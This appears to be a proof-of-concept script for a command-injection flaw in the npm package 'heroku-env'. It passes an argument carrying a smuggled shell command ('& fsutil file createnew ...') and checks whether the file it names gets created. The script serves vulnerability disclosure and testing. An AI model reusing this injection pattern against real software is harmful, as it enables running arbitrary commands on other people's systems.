Reflect.getPrototypeOf = () => false;
const root = require('heroku-env');
const fs = require('fs');
const path = './heroku-env';
try {
    if (fs.existsSync(path)) {
        fs.unlinkSync(path);
    }
} catch (err) {
    console.error(err);
}
file_exist = fs.existsSync(path);
console.log('{ ' + file_exist + ', ' + false + ' }');
root('& fsutil file createnew heroku-env 0', 'aa', function () {
    file_exist = fs.existsSync(path);
    console.log('{ ' + file_exist + ', ' + true + ' }');
    fs.unlink(path, function (err) {
    });
});